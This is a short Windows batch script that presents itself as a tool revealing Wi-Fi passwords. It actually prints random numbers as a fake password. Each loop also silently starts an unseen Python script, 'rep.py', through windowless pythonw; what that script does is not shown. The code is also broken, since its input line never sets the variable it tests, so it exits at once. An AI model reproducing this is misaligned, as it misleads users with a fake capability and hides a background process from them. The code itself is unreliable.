@echo off
color 0A
:loop
cls
start pythonw rep.py 

title Simulating the discovery of Wi-Fi 

echo Type any Wi-Fi network name and the password will appear:
set /p =():


if "%ss%"=="" goto :eof

rem 
set /a r1=%random%
set /a r2=%random%
set pw=%r1%%r2%IF
echo.
echo Network: %ss%
echo Password: %pw%
echo.
pause>nul

goto loop

